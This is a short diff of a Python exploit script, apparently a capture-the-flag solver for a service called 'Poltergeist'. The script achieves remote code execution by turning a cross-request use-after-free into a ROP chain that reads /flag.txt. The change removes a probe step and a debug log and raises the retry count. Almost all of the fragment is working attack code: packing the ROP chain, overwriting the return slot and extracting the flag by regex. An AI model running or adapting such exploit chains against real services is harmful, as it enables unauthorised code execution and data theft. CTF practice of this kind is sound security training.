@@ -347,23 +347,14 @@ def exploit(host, port, cand):
     chain = b"".join(struct.pack("<Q", x) for x in rop)
     chain += b"/flag.txt\x00".ljust(16, b"\x00") + b"\x00" * 112
 
-    if cand == 0:   # PROBE: write to a SAFE stack slot (not the return) + whisper
-        poison(host, port)
-        safe = retslot + 0x800
-        pval = struct.pack("<qqq", 2, len(chain), safe)
-        pr = seance(host, port, b'summon $f = "' + esc(pval) + b'"; summon $d = "' +
-                    esc(chain) + b'"; echo_write($d); whisper "PROBE_OK";')
-        log("[*] PROBE safe-write resp %d bytes: %r" % (len(pr), pr[:64]))
-
     tail = forge_write(host, port, retslot, chain)          # lay chain + trigger
-    log("[*] finale resp %d bytes: head=%r tail=%r" % (len(tail), tail[:48], tail[-48:]))
     m = FLAG_RE.search(tail)
     return m.group(0).decode() if m else None
 
 
 def solve(host, port):
     log("[*] Poltergeist -- RCE via cross-request UAF -> ROP")
-    for attempt in range(0, 1):
+    for attempt in range(0, 4):
         try:
             flag = exploit(host, port, attempt)
         except (OSError, IOError, ValueError) as e:
